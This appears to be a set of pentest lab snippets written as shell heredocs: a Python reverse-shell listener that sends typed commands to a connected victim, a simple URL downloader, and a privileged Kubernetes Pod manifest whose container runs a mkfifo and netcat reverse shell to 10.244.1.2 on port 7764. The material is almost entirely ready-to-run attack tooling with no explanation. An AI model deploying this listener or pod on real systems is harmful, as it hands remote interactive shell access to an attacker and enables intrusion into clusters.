```
cat <<EOF > reverse_shell.py
import socket, sys, time
import argparse

def listen(ip,port):
    #validate IP address
    try:
        socket.inet_aton(ip)
    except socket.error:
        print(f"Invalid IP address: {ip}")
        return
    #validate port number
    if not (1024 < port < 65535):
        print(f"Enter Port > 1024, Invalid Port: {port}")
        return

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((ip, port))
    s.listen(1)
    print(f"Listening on IP: {ip} and Port: {port}")
    conn, addr = s.accept()
    print(f'Connection received from {addr}')
    while True:
        #Receive data from the target and get user input
        ans = conn.recv(1024).decode()
        sys.stdout.write(ans)
        command = input()

        #Send command
        command += "\n"
        conn.send(command.encode())
        time.sleep(1)

        #Remove the output of the "input()" function
        sys.stdout.write("\033[A" + ans.split("\n")[-1])
        
#parse command line arguments
parser = argparse.ArgumentParser()
parser.add_argument("-i", "--ip", required=True, help="IP address to bind the socket")
parser.add_argument("-p", "--port", required=True, type=int, help="Port number to bind the socket")
args = parser.parse_args()

listen(args.ip, args.port)
EOF
```


```
cat <<EOF > download.py
import argparse
import urllib.request

#parse command line arguments
parser = argparse.ArgumentParser()
parser.add_argument("-u", "--url", required=True, help="URL of the file to download")
parser.add_argument("-f", "--filename", required=True, help="Filename to save the downloaded file")
args = parser.parse_args()

# download the file
urllib.request.urlretrieve(args.url, args.filename)
print(f"File downloaded and saved as {args.filename} successfully")
EOF
```

```
cat <<EOF > reverse_shell_pod.yaml
apiVersion: v1
kind: Pod
metadata:
  name: netcat-pod
  labels:
    app: pentest
spec:
  containers:
  - name: netcat-pod
    image: justmorpheu5/netcat-vuln
    command: ["sh", "-c", "mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.244.1.2 7764 >/tmp/f"]
    securityContext:
      runAsUser: 1000
      runAsNonRoot: true
      privileged: true
EOF
```